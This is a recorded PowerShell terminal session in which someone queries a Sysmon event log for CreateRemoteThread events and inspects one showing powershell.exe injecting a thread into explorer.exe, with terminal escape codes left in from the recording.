+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+[K1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+[K1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+[K1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...                                    
+1/21/2021 5:05:50 PM             3 Information      Network connection detected:...                                    
+1/21/2021 5:05:49 PM             7 Information      Image loaded:...                                                   
+1/21/2021 5:05:46 PM            23 Information      File Delete:...                                                    
+1/21/2021 5:05:46 PM            12 Information      Registry object added or deleted:...                               
+1/21/2021 5:05:46 PM            12 Information      Registry object added or deleted:...                               
+1/21/2021 5:05:46 PM            12 Information      Registry object added or deleted:...                               
+1/21/2021 5:05:46 PM            11 Information      File created:...                                                   
+1/21/2021 5:05:45 PM             1 Information      Process Create:...                                                 
+[K
+
+PS C:\Users\Administrator\Desktop> [KPS C:\Users\Administrator\Desktop> [K[?2004hPS C:\Users\Administrator\Desktop> [7mGet-WinEvent -Path .\sysmon.evtx -FilterXPath '*/System/EventID=8' -O[27m[7ml[27m[7mdest | Where-Object {$_.TimeCreated -ge $stTime} | Select-Object -First 1 | fl[27m[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004hGet-WinEvent -Path .\sysmon.evtx -FilterXPath '*/System/EventID=8' -Oldest | Where-Object {$_.TimeCreated -ge $stTime} | Select-Object -First 1 | fl
+[KG[KG[KGet-WinEvent -Path .\sysmon.evtx -FilterXPath '*/System/EventID=8' -Oldest | Where-Object {$_.TimeCreated -ge $stTime} | Select-Object -First 1 | fl
+
+
+TimeCreated  : 1/21/2021 5:07:06 PM
+ProviderName : Microsoft-Windows-Sysmon
+Id           : 8
+Message      : CreateRemoteThread detected:
+               RuleName: -
+               UtcTime: 2021-01-22 01:07:06.182
+               SourceProcessGuid: {786593ca-24e9-600a-eb00-000000000300}
+               SourceProcessId: 3088
+               SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+               TargetProcessGuid: {786593ca-776d-6009-4b00-000000000300}
+               TargetProcessId: 2684
+               TargetImage: C:\Windows\explorer.exe
+               NewThreadId: 4872
+               StartAddress: 0x00000000027D0000
+               StartModule: -
+               StartFunction: -
+
+
+
+PS C:\Users\Administrator\Desktop> [KPS C:\Users\Administrator\Desktop> [K[?2004hPS C:\Users\Administrator\Desktop> exit[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hexit
+[Ke[Ke[Kexit
+
+C:\Users\Administrator\Desktop>[KC:\Users\Administrator\Desktop>[K[?2004hC:\Users\Administrator\Desktop>exit[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hexit
+[Kexit
+[?2004l
+Script done on 2025-05-03 15:22:37+03:00 [COMMAND_EXIT_CODE="0"]
